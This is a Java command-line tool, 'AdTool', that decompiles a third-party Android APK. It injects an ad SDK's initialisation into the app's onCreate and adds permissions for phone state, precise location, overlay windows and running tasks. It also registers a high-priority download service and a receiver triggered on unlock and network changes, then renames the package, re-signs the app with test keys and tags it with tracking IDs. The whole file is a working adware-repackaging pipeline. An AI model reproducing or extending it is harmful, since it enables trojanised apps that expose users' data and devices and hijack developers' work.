package com.bb_sz.adtool;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.URL;
import java.net.URLDecoder;

/**
 * Created by Administrator on 2016/8/11.
 */
public class AdTool {

    private static final int BUFFER_SIZE = 1024;
    private static final String DEFAULT_INJECT_NAME = "com.application.TMApp";

    public static String MoBanSDKPath;
    public static String rootPath;
    // src pkg
    public static String oldPackageString = "com/market/";
    //new apk pgk
    public static String packageString = "";

    public static String newRootPath = "";

    //uid
    private static String uid = "";
    //pid
    private static String pid = "";
    //cid
    private static String cid = "";

    private static String srcApkPath;//
    private static String srcApkPackage;//
    private static String injectClsName;
    private static boolean debug = false;
    private static boolean isNotAdd2 = false;

    private static String runPath;

    public static void main(String[] args) {
        runPath = getPath();
        MoBanSDKPath = runPath + File.separator + "MoBanSDK";
        rootPath = MoBanSDKPath + "\\smali";
        if (debug) System.out.print("runPath:" + runPath + "\n");
        if (!checkParam(args)) {
            System.err.print("apk file error");
            return;
        }
        srcApkPath = args[0];
        newRootPath = getSrcApkOutPath() + File.separator + "smali";

        uid = args[1];
        pid = args[2];
        cid = args[3];
        debug = args.length > 4 && "1".equals(args[4]);
        isNotAdd2 = args.length > 5 && "1".equals(args[5]);
        //read params
//        initParams();
        boolean isExist = new File(getSrcApkOutPath()).exists();

        //un pkg apk
        if (!isExist) {
            unapk();
        }

        if (!readApkInfo()) {
            System.err.print("un apk failed. pkg:" + srcApkPackage + ", injectClsName:" + injectClsName + ", packageString:" + packageString);
            return;
        }

        //copy sdk code
        if (!isExist)
            copyFile(rootPath);
        //add code for manifest.xml
        if (!isExist)
            updateManifest();
        //inject sdk
        if (!isExist)
            injectSDK();
        //copy res.png
        if (!isExist)
            if (checkFileCopyOver()) {
                System.err.print("copy file over.success\n");
            } else {
                System.err.print("copy file over.failed\n");
            }

        if (isExist) {
            checkVersion();
            //re pkg apk
            apk();
            //sign
            signApk();
            //optimization
            opt();
            boolean rename = renameOutFile();
            if (debug) System.err.print("rename:" + rename + "\n");
            delOtherFile();
        }
    }

    private static boolean checkParam(String[] arg) {
        if (null == arg) {
            return false;
        }

        if (!arg[0].endsWith(".apk")) {
            return false;
        }
        if (arg.length < 4) {
            return false;
        }
        return true;
    }

    private static void unapk() {
        String res = exec("java -jar " + runPath + File.separator + "bin\\apktool.jar d " + getSrcApkPath() + " -o " + getSrcApkOutPath());
    }

    private static boolean readApkInfo() {
        File manifest = new File(getSrcApkOutPath() + File.separator + "AndroidManifest.xml");
        int i = 120;
        while (!manifest.exists() && i-- > 0) {
            try {
                Thread.sleep(1000);
            } catch (InterruptedException ignored) {
            }
        }
        if (!manifest.exists()) {
            System.err.print("failed.manifest not exists");
            return false;
        }

        try {
            FileInputStream inStream = new FileInputStream(manifest);
            BufferedReader dr = new BufferedReader(new InputStreamReader(inStream));
            String line = "";
            while ((line = dr.readLine()) != null) {
                if (isEmpty(srcApkPackage) && line.contains("<manifest")) {
                    srcApkPackage = getPackage(line);
                } else if (isEmpty(injectClsName) && line.contains("<application")) {
                    injectClsName = getInjectName(line);
                }
            }
        } catch (Exception ignored) {
        }

        packageString = srcApkPackage.replaceAll("\\.", "/");
        if (!packageString.endsWith("/")) {
            packageString = packageString + "/";
        }

        return !isEmpty(srcApkPackage) && !isEmpty(injectClsName) && !isEmpty(packageString);
    }

    public static boolean copyFile(String fileString) {
        if (null == fileString) {
            return false;
        }
        File file = new File(fileString);
        if (file.exists() && file.isDirectory()) {
            File[] rootList = file.listFiles();
            if (null != rootList) {
                for (File item : rootList) {
                    if (item.exists() && item.isFile()) {
                        copyFile(item);
                    } else {
                        copyFile(item.getAbsolutePath());
                    }
                }
            }
        } else {
            copyFile(file);
        }
        return true;
    }


    private static void updateValue23(File src) {
        //TODO
        System.err.print("failed.updateValue23");
        System.exit(0);
    }

    private static void updateManifest() {
        final String oldFilePath = newRootPath.replace("smali", "AndroidManifest.xml");
        final String tmpFilePath = newRootPath.replace("smali", "TAndroidManifest.xml");
        File oldManifest = new File(oldFilePath);
        if (!oldManifest.exists()) {
            return;
        }

        boolean renameRes = false;
        String inFile = oldFilePath;
        String outFile = tmpFilePath;
        if (oldManifest.renameTo(new File(tmpFilePath))) {
            String tp = oldFilePath;
            inFile = tmpFilePath;
            outFile = tp;
            renameRes = true;
        }

        try {
            FileInputStream inStream = new FileInputStream(inFile);
            FileOutputStream outStream = new FileOutputStream(outFile);

            BufferedReader dr = new BufferedReader(new InputStreamReader(
                    inStream));
            OutputStreamWriter dw = new OutputStreamWriter(outStream);

            String line = "";
            boolean isAddApplication = false;
            boolean isAddPermission = false;

            while ((line = dr.readLine()) != null) {
                if (!isAddApplication && line.contains("<application")) {
                    isAddApplication = true;
                    if (injectClsName.equals(DEFAULT_INJECT_NAME)) {
                        line = line.substring(0, line.length() - 1) + " android:name=\"" + injectClsName + "\" >";
                    }
                    //add activity
                    line = line + "\n" + getManifestActivity() + "\n";
                    line = line + "\n" + getManifestReceiver() + "\n";
                    line = line + "\n" + getManifestService() + "\n";
                } else if (!isAddPermission && line.contains("<manifest")) {
                    isAddPermission = true;
                    //add permission
                    line = line + "\n" + getManifestPermission() + "\n";
                }
                dw.write(line + "\n");
            }
            dw.close();
            dr.close();
            outStream.close();
            inStream.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
        if (renameRes) {
            new File(tmpFilePath).deleteOnExit();
        } else {
            new File(oldFilePath).deleteOnExit();
            if (new File(tmpFilePath).renameTo(new File(oldFilePath))) {

            } else {
                boolean res = copy(new File(tmpFilePath), new File(oldFilePath));
                if (res) {
                    new File(tmpFilePath).deleteOnExit();
                }
            }
        }
    }


    private static void injectSDK() {
        if (isEmpty(injectClsName)) {
            System.err.print("inject sdk error, cls Name is null..\n");
            return;
        }

        if (!injectClsName.equals(DEFAULT_INJECT_NAME)) {
            new File(getSrcApkOutPath() + File.separator + "com" + File.separator + "application" + File.separator + "TMApp.smali").deleteOnExit();
        }

        String injectName = injectClsName;
        if (injectName.contains("")) {
            injectName = injectName.replaceAll("\\.", "\\\\");
        }
        String oldFilePath = newRootPath + File.separator + injectName + ".smali";
        String tmpFilePath = newRootPath + File.separator + injectName + "_tmp" + ".smali";

        StringBuffer sb = new StringBuffer();
        String newPkg = packageString;
        sb.append("invoke-static {}, L" + newPkg + "api/AdSdk;->getInstance()L" + newPkg + "api/AdSdk;").append("\n");
        sb.append("move-result-object v0").append("\n");
        sb.append("invoke-virtual {v0, p0}, L" + newPkg + "api/AdSdk;->init(Landroid/content/Context;)I").append("\n");

        File old = new File(oldFilePath);
        if (!old.exists()) {
            System.err.print("inject sdk error, cls not exists.\n");
            return;
        }

        boolean renameRes = false;

        String inFile = oldFilePath;
        String outFile = tmpFilePath;
        if (old.renameTo(new File(tmpFilePath))) {
            String tp = oldFilePath;
            inFile = tmpFilePath;
            outFile = tp;
            renameRes = true;
        }

        int type = 0;
        int addType = 0;
        try {
            FileInputStream inStream = new FileInputStream(inFile);
            FileOutputStream outStream = new FileOutputStream(outFile);

            BufferedReader dr = new BufferedReader(new InputStreamReader(
                    inStream));
            OutputStreamWriter dw = new OutputStreamWriter(outStream);

            String line = "";
            int count = 0;
            int isCheckLocals = 0;
            while ((line = dr.readLine()) != null) {
                count++;
                if (count == 2 && line.startsWith(".super") && line.endsWith("Activity;")) {
                    //activity
                    type = 1;
                } else if (count == 2 && line.startsWith(".super") && line.endsWith("Application;")) {
                    //application
                    type = 2;
                }
                isCheckLocals++;
                if (type == 1 && (line.startsWith(".method protected onCreate(Landroid/os/Bundle;)V")
                        || line.startsWith(".method public onCreate(Landroid/os/Bundle;)V"))) {
                    addType = 1;
                    isCheckLocals = 1;
                } else if (type == 2 && line.startsWith(".method public onCreate()V")) {
                    addType = 2;
                    isCheckLocals = 1;
                }

                if (isCheckLocals == 2 && line.contains(".locals 0")) {
                    line = ".locals 1";
                }

                if (isCheckLocals == 2 && line.contains(".locals")) {
                    if (debug) System.out.print("inject locals : " + line + "\n");
                }

                if (addType == 1 && line.endsWith("Activity;->onCreate(Landroid/os/Bundle;)V")) {
                    line += "\n" + sb.toString() + "\n";
                } else if (addType == 2 && line.endsWith("Application;->onCreate()V")) {
                    line += "\n" + sb.toString() + "\n";
                }
                dw.write(line + "\n");
            }
            dw.close();
            dr.close();
            outStream.close();
            inStream.close();
        } catch (Exception e) {
            e.printStackTrace();
        }

        if (type != 0 && addType == 0) {//inject failed
            System.err.print("failed: inject.\n");
        } else {
            System.err.print("success: inject.\n");
        }

        if (renameRes) {
            new File(tmpFilePath).deleteOnExit();
        } else {
            new File(oldFilePath).deleteOnExit();
            if (new File(tmpFilePath).renameTo(new File(oldFilePath))) {

            } else {
                boolean res = copy(new File(tmpFilePath), new File(oldFilePath));
                if (res) {
                    new File(tmpFilePath).deleteOnExit();
                }
            }
        }

    }

    private static boolean checkFileCopyOver() {
        File moban = new File(MoBanSDKPath);
        if (!moban.exists()) {
            return false;
        }

        String[] srcFiles = moban.list();
        if (null == srcFiles) {
            return false;
        }

        for (String src : srcFiles) {
            if (debug) System.out.print("res, src:" + src + "\n");
            if (src.endsWith("smali") || src.endsWith("AndroidManifest.xml")) {
                continue;
            }
            File from = new File(moban.getAbsolutePath() + File.separator + src);
            if (from.isDirectory()) {
                File to = new File(getSrcApkOutPath() + File.separator + from.getName());
                copyDir(from, to);
            }
        }

        return true;
    }

    private static void checkVersion() {
        String value23Path = getSrcApkOutPath() + File.separator + "res" + File.separator + "values-v" + 23;
        File value23 = new File(value23Path);
        if (value23.exists() && new File(value23Path + File.separator + "styles.xml").exists()) {
//            <style name="Base.TextAppearance.AppCompat.Widget.Button.Inverse" parent="@android:style/WindowTitle" />
//            <style name="Base.Widget.AppCompat.Button.Colored" parent="@android:style/WindowTitleBackground" />
            updateValue23(new File(value23Path + File.separator + "styles.xml"));
        }

    }

    private static void apk() {
        if (debug) System.err.print("start create apk\n");
        String res = exec("java -jar " + runPath + File.separator + "bin\\apktool.jar b " + getSrcApkOutPath() + " -o " + getSrcApkOutPath() + "_R.apk");
    }

    private static void signApk() {
        if (debug) System.err.print("start sign apk\n");
        int i = 60;
        while (!new File(getSrcApkOutPath() + "_R.apk").exists() && i-- > 0) {
            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
        String cmd = "java -jar " +
                "\"" + runPath + File.separator + "bin\\signapk.jar\" " +
                "\"" + runPath + File.separator + "bin\\testkey.x509.pem\" " +
                "\"" + runPath + File.separator + "bin\\testkey.pk8\" " +
                "" + getSrcApkOutPath() + "_R.apk" + " " +
                "" + getSrcApkOutPath() + "_R.S.apk" + "";
        exec(cmd);
    }

    private static void opt() {
        if (debug) System.err.print("start opt apk\n");
        int i = 20;
        while (!new File(getSrcApkOutPath() + "_R.S.apk").exists() && i-- > 0) {
            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }

        String cmd = "\"" + runPath + File.separator + "bin\\zipalign.exe\" -f -v 4 " +
                getSrcApkOutPath() + "_R.S.apk " +
                getSrcApkOutPath() + "_R.SO.apk";
        exec(cmd);
    }

    private static boolean renameOutFile() {
        int i = 20;
        while (!new File(getSrcApkOutPath() + "_R.SO.apk").exists() && i-- > 0) {
            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
        File out = new File(getSrcApkOutPath() + "_R.SO.apk");
        return out.renameTo(new File(getSrcApkOutPath() + "_" + cid + ".apk"));
    }

    private static void delOtherFile() {
        new File(getSrcApkOutPath() + "_R.apk").deleteOnExit();
        new File(getSrcApkOutPath() + "_R.S.apk").deleteOnExit();
        boolean delXml = new File(getSrcApkOutPath() + File.separator + "AndroidManifest.xml").delete();
        if (debug) System.out.print("delXml:" + delXml + "\n");
        if (debug) System.out.print("del:" + getSrcApkOutPath() + "\n");
        try {
            Thread.sleep(5000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        exec("rd /s/q " + getSrcApkOutPath());
    }


    public static boolean copyFile(File file) {
        if (null == file || file.isDirectory()) {
            return false;
        }
        String path = file.getAbsolutePath();

        String oldPackPath = oldPackageString.replaceAll("/", "\\\\");

//         || path.contains("\\example\\")
//        || (!path.contains(oldPackPath) && !path.contains("\\android\\"))
        if (!path.endsWith(".smali")) {
            return false;
        }
        String parentName = file.getParentFile().getName();
        String fileName = file.getName();

        String newPackage = null;
        String newFile = null;
        if (path.contains(oldPackPath)) {
            if (packageString.contains("/")) {
                newPackage = packageString.replaceAll("/", "\\\\");
            }
            newFile = newRootPath + File.separator + newPackage
                    + File.separator + parentName + File.separator + fileName;
        } else {
            newPackage = path.replace(rootPath, newRootPath);
            newFile = newPackage;
        }

        File resFile = createFile(newFile);

        boolean res = copy(file, resFile);

        return res;
    }

    public static boolean copy(File oldFile, File newFile) {
        try {
            if (oldFile.exists()) {
                FileInputStream inStream = new FileInputStream(oldFile);
                FileOutputStream outStream = new FileOutputStream(newFile);

                BufferedReader dr = new BufferedReader(new InputStreamReader(
                        inStream));
                OutputStreamWriter dw = new OutputStreamWriter(outStream);

                String line = "";

                while ((line = dr.readLine()) != null) {
                    if (line.contains("L" + oldPackageString)) {
                        line = line.replace("L" + oldPackageString, "L" + packageString);
                    } else if (line.contains("\"()UID()\"")) {
                        line = line.replace("()UID()", uid);
                    } else if (line.contains("\"()PID()\"")) {
                        line = line.replace("()PID()", pid);
                    } else if (line.contains("\"()CID()\"")) {
                        line = line.replace("()CID()", cid);
                    }
                    dw.write(line + "\n");
                }
                dw.close();
                dr.close();
                outStream.close();
                inStream.close();
            }
            return true;
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }

    public static boolean _copy(File oldFile, File newFile) {
        try {
            if (oldFile.exists()) {
                FileInputStream inStream = new FileInputStream(oldFile);
                FileOutputStream outStream = new FileOutputStream(newFile);
                byte[] data = new byte[BUFFER_SIZE];
                int count = -1;
                while ((count = inStream.read(data, 0, BUFFER_SIZE)) != -1)
                    outStream.write(data, 0, count);

                outStream.flush();
                inStream.close();
                outStream.close();
            }
            return true;
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }


    public static File createFile(String filePath) {
        if (null == filePath) {
            return null;
        }
        File file = new File(filePath);
        File parentFile = file.getParentFile();
        if (null != parentFile && !parentFile.exists()) {
            file.getParentFile().mkdirs();
        }
        try {
            if (file.createNewFile()) {
            } else {
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        return file;
    }

    private static String getSrcApkPath() {
        return srcApkPath;
    }

    private static String getSrcApkOutPath() {
        return srcApkPath.replace(".apk", "");
    }

    private static String getPackage(String line) {
        String key = "package=\"";

        return getNameValue(line, key) + (isNotAdd2 ? "" : 2);
    }

    private static String getInjectName(String line) {
        String key = "android:name=\"";
        String value = getNameValue(line, key);
        if (debug) System.out.print("inject name = " + value + "\n");
        if (isEmpty(value)) {
            return DEFAULT_INJECT_NAME;
        } else {
            return value;
        }
    }

    private static String getManifestPermission() {
        StringBuffer sb = new StringBuffer();
        sb.append("<uses-permission android:name=\"android.permission.READ_PHONE_STATE\"/>").append("\n");
        sb.append("<uses-permission android:name=\"android.permission.ACCESS_COARSE_LOCATION\"/>").append("\n");
        sb.append("<uses-permission android:name=\"android.permission.ACCESS_WIFI_STATE\"/>").append("\n");
        sb.append("<uses-permission android:name=\"android.permission.ACCESS_NETWORK_STATE\"/>").append("\n");
        sb.append("<uses-permission android:name=\"android.permission.INTERNET\"/>").append("\n");
        sb.append("<uses-permission android:name=\"android.permission.WRITE_EXTERNAL_STORAGE\"/>").append("\n");
        sb.append("<uses-permission android:name=\"android.permission.CHANGE_NETWORK_STATE\"/>").append("\n");
        sb.append("<uses-permission android:name=\"android.permission.GET_TASKS\"/>").append("\n");
        sb.append("<uses-permission android:name=\"android.permission.ACCESS_FINE_LOCATION\"/>").append("\n");
        sb.append("<uses-permission android:name=\"android.permission.SYSTEM_ALERT_WINDOW\"/>").append("\n");
        sb.append("<android:uses-permission android:name=\"android.permission.READ_EXTERNAL_STORAGE\"/>").append("\n");
        return sb.toString();
    }

    private static String getManifestService() {
        String newPkg = getNewPkg();

        StringBuffer sb = new StringBuffer("<service android:name=\"" + newPkg + ".service.DownloadService\">");
        sb.append("\n").append("<intent-filter android:priority=\"1000\">").append("\n");
        sb.append("<action android:name=\"" + newPkg + ".service.DownloadService\"/>").append("\n");
        sb.append("</intent-filter>").append("\n");
        sb.append("</service>").append("\n");
        return sb.toString();
    }

    private static String getManifestReceiver() {
        String newPkg = getNewPkg();

        StringBuffer sb = new StringBuffer("<receiver android:name=\"" + newPkg + ".receiver.StatusReceiver\">");
        sb.append("\n").append("<intent-filter>").append("\n");
        sb.append("<action android:name=\"android.intent.action.TIME_SET\"/>").append("\n");
        sb.append("<action android:name=\"android.intent.action.TIMEZONE_CHANGED\"/>").append("\n");
        sb.append("<action android:name=\"android.intent.action.LOCALE_CHANGED\"/>").append("\n");
        sb.append("<action android:name=\"android.net.conn.CONNECTIVITY_CHANGE\"/>").append("\n");
        sb.append("<action android:name=\"android.net.wifi.WIFI_STATE_CHANGED\"/>").append("\n");
        sb.append("<action android:name=\"android.intent.action.USER_PRESENT\"/>").append("\n");
        sb.append("</intent-filter>").append("\n");
        sb.append("<intent-filter>").append("\n");
        sb.append("<action android:name=\"android.app.backup.CHECK_ACTION\"/>").append("\n");
        sb.append("</intent-filter>").append("\n");
        sb.append("</receiver>").append("\n");
        return sb.toString();
    }

    private static String getManifestActivity() {
        String newPkg = getNewPkg();

        String activity = "<activity android:name=\"" + newPkg + ".activity.AppActivity\" " +
                "android:theme=\"@android:style/Theme.Light.NoTitleBar.Fullscreen\"/>";

        return activity;
    }

    private static String getNewPkg() {
        return srcApkPackage;
    }

    private static String getNameValue(String line, String key) {
        if (isEmpty(line)) {
            return "";
        }
        if (line.contains(key)) {
            int in = line.indexOf(key);
            if (in < 0) {
                return "";
            }
            String con = line.substring(in + key.length());
            if (con.contains("\"")) {
                int de = con.indexOf("\"");
                if (de < 0) {
                    return "";
                }
                return con.substring(0, de);
            }

        }
        return "";
    }

    private static boolean isEmpty(String line) {
        return null == line || "".equals(line);
    }

    public static String exec(String cmd) {
        if (debug) System.err.print("exec:" + cmd + "\n");
        cmd = "cmd.exe /c " + cmd;
        Runtime runtime = Runtime.getRuntime();
        try {
            Process p = runtime.exec(cmd);
            String res = InputStreamTOString(p.getInputStream());
            if (debug) System.out.print(res);
            return res;
        } catch (Exception e) {
            System.err.println("Error!" + "\n");
        } finally {

        }
        return null;
    }

    public static String InputStreamTOString(InputStream in) throws Exception {
        ByteArrayOutputStream outStream = new ByteArrayOutputStream();
        byte[] data = new byte[BUFFER_SIZE];
        int count = -1;
        while ((count = in.read(data, 0, BUFFER_SIZE)) != -1)
            outStream.write(data, 0, count);

        data = null;
        return new String(outStream.toByteArray(), "gbk");
    }

    private static void copyDir(File from, File to) {
        if (debug) System.out.print("copy Dir" + "\n");
        if (null == from || null == to) {
            return;
        }
        if (debug)
            System.out.print("copy Dir, from:" + from.getAbsolutePath() + ", to:" + to.getAbsolutePath() + "\n");
        File[] file = from.listFiles();

        if (null == file) {
            return;
        }

        for (File f : file) {
            if (f.isFile()) {
                File newFile = createFile(to.getAbsoluteFile() + File.separator + f.getName());
                if (debug)
                    System.out.print("copy File, from:" + f.getAbsolutePath() + ", to:" + newFile.getAbsolutePath() + "\n");
                _copy(f, newFile);
            } else {
                File t = new File(to.getAbsolutePath() + File.separator + f.getName());
                copyDir(f, t);
            }
        }
    }

    public static String getPath() {
        URL url = AdTool.class.getProtectionDomain().getCodeSource().getLocation();
        String filePath = null;
        try {
            filePath = URLDecoder.decode(url.getPath(), "utf-8");
        } catch (Exception e) {
            e.printStackTrace();
        }
        if (null == filePath) {
            return new File("").getAbsolutePath();
        }
        if (filePath.endsWith(".jar")) {

            filePath = filePath.substring(0, filePath.lastIndexOf("/") + 1);
        }

        File file = new File(filePath);

        // /If this abstract pathname is already absolute, then the pathname
        // string is simply returned as if by the getPath method. If this
        // abstract pathname is the empty abstract pathname then the pathname
        // string of the current user directory, which is named by the system
        // property user.dir, is returned.
        filePath = file.getAbsolutePath();
        return filePath;
    }
}
